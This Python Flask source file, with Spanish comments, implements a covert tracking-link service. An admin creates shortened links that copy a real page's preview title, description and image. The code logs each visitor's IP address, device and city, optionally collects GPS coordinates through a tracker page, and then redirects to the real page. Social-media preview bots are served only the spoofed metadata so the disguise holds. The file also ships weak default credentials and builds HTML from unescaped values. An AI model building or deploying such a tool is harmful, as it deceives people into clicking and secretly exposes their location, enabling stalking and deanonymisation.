import os
import random
import string
import requests
from bs4 import BeautifulSoup
from flask import Flask, request, jsonify, redirect, render_template, session
from datetime import datetime, timedelta
import psycopg2 

app = Flask(__name__)

# --- CONFIGURACIÓN DE SEGURIDAD ---
# Llave para encriptar la sesión (necesaria para el login)
app.secret_key = os.environ.get("SECRET_KEY", "super_secreto_random_123")
# Tu contraseña de administrador (Configúrala en Railway como variable ADMIN_PIN)
ADMIN_PIN = os.environ.get("ADMIN_PIN", "1234") 

DATABASE_URL = os.environ.get("DATABASE_URL")
HEADERS_FALSOS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36','Accept-Language': 'es-ES,es;q=0.9'}

def get_db_connection():
    if not DATABASE_URL: return None
    conn = psycopg2.connect(DATABASE_URL)
    return conn

def inicializar_db():
    try:
        conn = get_db_connection()
        if conn is None: return
        cur = conn.cursor()
        cur.execute("""CREATE TABLE IF NOT EXISTS trampas (id SERIAL PRIMARY KEY, token VARCHAR(50) UNIQUE NOT NULL, nombre VARCHAR(100), url_destino TEXT, meta_titulo TEXT, meta_desc TEXT, meta_img TEXT, usar_gps BOOLEAN DEFAULT FALSE, created_at TIMESTAMP DEFAULT NOW());""")
        cur.execute("""CREATE TABLE IF NOT EXISTS intrusos (id SERIAL PRIMARY KEY, trampa_id INTEGER REFERENCES trampas(id), ip_address VARCHAR(45), user_agent TEXT, city VARCHAR(100), lat TEXT, lon TEXT, accuracy TEXT, captured_at TIMESTAMP DEFAULT NOW());""")
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e: print(f"Error DB: {e}")

@app.route('/update_db_schema')
def update_db_schema():
    # PROTEGIDO: Solo el admin puede tocar la base de datos
    if not session.get('logged_in'): return redirect('/login')
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("ALTER TABLE trampas ADD COLUMN IF NOT EXISTS usar_gps BOOLEAN DEFAULT FALSE;")
        cur.execute("ALTER TABLE intrusos ADD COLUMN IF NOT EXISTS lat TEXT;")
        cur.execute("ALTER TABLE intrusos ADD COLUMN IF NOT EXISTS lon TEXT;")
        cur.execute("ALTER TABLE intrusos ADD COLUMN IF NOT EXISTS accuracy TEXT;")
        conn.commit()
        cur.close()
        conn.close()
        return "DB OK"
    except: return "Error"

# --- HERRAMIENTAS ---
def generar_token(): return ''.join(random.choices(string.ascii_letters + string.digits, k=6))

def obtener_ubicacion(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
        return f"{r['city']}, {r['country']}" if r['status']=='success' else "Desconocida"
    except: return "Error Geo"

def acortar_link(url):
    try:
        r = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5)
        return r.text.strip() if r.status_code==200 else url
    except: return url

def clonar_metadatos(url):
    try:
        r = requests.get(url, headers=HEADERS_FALSOS, timeout=5)
        s = BeautifulSoup(r.text, 'html.parser')
        t = s.find("meta", property="og:title")
        d = s.find("meta", property="og:description")
        i = s.find("meta", property="og:image")
        return (t["content"] if t else "Video", d["content"] if d else "Ver", i["content"] if i else "")
    except: return "Video", "Ver", ""

# ==========================================
# SISTEMA DE LOGIN (NUEVO)
# ==========================================

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        data = request.json
        # Verificamos si el PIN coincide
        if data.get('pin') == ADMIN_PIN:
            session['logged_in'] = True
            return jsonify({"status": "ok"})
        else:
            return jsonify({"status": "error"}), 401
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

# ==========================================
# RUTAS PROTEGIDAS (Dashboard)
# ==========================================

@app.route('/')
def home():
    # Si no está logueado, lo mandamos al login
    if not session.get('logged_in'): return redirect('/login')
    return render_template('index.html')

@app.route('/api/borrar_logs', methods=['POST'])
def borrar_logs():
    if not session.get('logged_in'): return jsonify({"error": "Auth required"}), 401
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("DELETE FROM intrusos;")
        conn.commit()
        cur.close()
        conn.close()
        return jsonify({"status": "ok"})
    except Exception as e: return jsonify({"error": str(e)}), 500

@app.route('/api/crear_trampa', methods=['POST'])
def crear_trampa():
    if not session.get('logged_in'): return jsonify({"error": "Auth required"}), 401
    d = request.json
    n = d.get('nombre', 'Trampa')
    u = d.get('url_destino', '')
    gps = d.get('usar_gps', False)
    mt = d.get('meta_titulo', '')
    md = d.get('meta_desc', '')
    mi = d.get('meta_img', '')
    
    if not mt: mt, md, mi = clonar_metadatos(u)
    
    tok = generar_token()
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO trampas (token, nombre, url_destino, meta_titulo, meta_desc, meta_img, usar_gps) VALUES (%s,%s,%s,%s,%s,%s,%s)", (tok, n, u, mt, md, mi, gps))
    conn.commit()
    cur.close()
    conn.close()
    return jsonify({"status": "ok", "link": acortar_link(f"{request.host_url}s/{tok}")})

@app.route('/api/ver_ataques', methods=['GET'])
def ver_ataques():
    if not session.get('logged_in'): return jsonify({"error": "Auth required"}), 401
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT t.nombre, i.ip_address, i.captured_at, i.user_agent, i.city, i.lat, i.lon FROM intrusos i JOIN trampas t ON i.trampa_id = t.id ORDER BY i.captured_at DESC LIMIT 50")
    res = cur.fetchall()
    cur.close()
    conn.close()
    out = []
    for r in res:
        h = r[2] - timedelta(hours=5)
        out.append({"trampa":r[0], "ip":r[1], "hora":h.strftime("%H:%M %d/%m"), "dispositivo":r[3], "ubicacion":r[4] if r[4] else "?", "lat":r[5], "lon":r[6]})
    return jsonify(out)

# ==========================================
# RUTAS PÚBLICAS (Trampas) - ESTAS NO SE PROTEGEN
# ==========================================

@app.route('/s/<token>')
def trampa(token):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip: ip = ip.split(',')[0].strip()
    ua = request.headers.get('User-Agent')
    
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT id, url_destino, meta_titulo, meta_desc, meta_img, usar_gps FROM trampas WHERE token=%s", (token,))
    res = cur.fetchone()
    
    if not res: return redirect("https://google.com")
    tid, url, mt, md, mi, gps = res
    
    es_bot = any(x in str(ua).lower() for x in ['facebook','whatsapp','telegram','twitter'])
    
    if not es_bot:
        cur.execute("INSERT INTO intrusos (trampa_id, ip_address, user_agent, city) VALUES (%s,%s,%s,%s)", (tid, ip, ua, obtener_ubicacion(ip)))
        conn.commit()
    cur.close()
    conn.close()
    
    if es_bot:
        return f"<!DOCTYPE html><html><head><meta property='og:title' content='{mt}'><meta property='og:description' content='{md}'><meta property='og:image' content='{mi}'><meta name='twitter:card' content='summary_large_image'></head><body></body></html>"
    
    if gps: return render_template('tracker.html')
    return redirect(url)

@app.route('/api/save_gps', methods=['POST'])
def save_gps():
    d = request.json
    t = d.get('token')
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT id FROM trampas WHERE token=%s", (t,))
    res = cur.fetchone()
    if res:
        tid = res[0]
        cur.execute("UPDATE intrusos SET lat=%s, lon=%s, accuracy=%s WHERE trampa_id=%s AND id=(SELECT MAX(id) FROM intrusos WHERE trampa_id=%s)", (str(d['lat']), str(d['lon']), str(d['acc']), tid, tid))
        conn.commit()
    cur.close()
    conn.close()
    return jsonify({"status": "ok"})

@app.route('/api/save_gps_bounce', methods=['GET'])
def save_gps_bounce():
    t = request.args.get('token')
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    acc = request.args.get('acc')
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT id, url_destino FROM trampas WHERE token=%s", (t,))
    res = cur.fetchone()
    url = "https://tiktok.com"
    if res:
        tid, url = res
        cur.execute("UPDATE intrusos SET lat=%s, lon=%s, accuracy=%s WHERE trampa_id=%s AND id=(SELECT MAX(id) FROM intrusos WHERE trampa_id=%s)", (lat, lon, acc, tid, tid))
        conn.commit()
    cur.close()
    conn.close()
    return redirect(url)

@app.route('/redirect/<token>')
def red_fin(token):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT url_destino FROM trampas WHERE token=%s", (token,))
    res = cur.fetchone()
    cur.close()
    conn.close()
    return redirect(res[0] if res else "https://tiktok.com")

inicializar_db()
if __name__ == '__main__': app.run(debug=True, port=5000)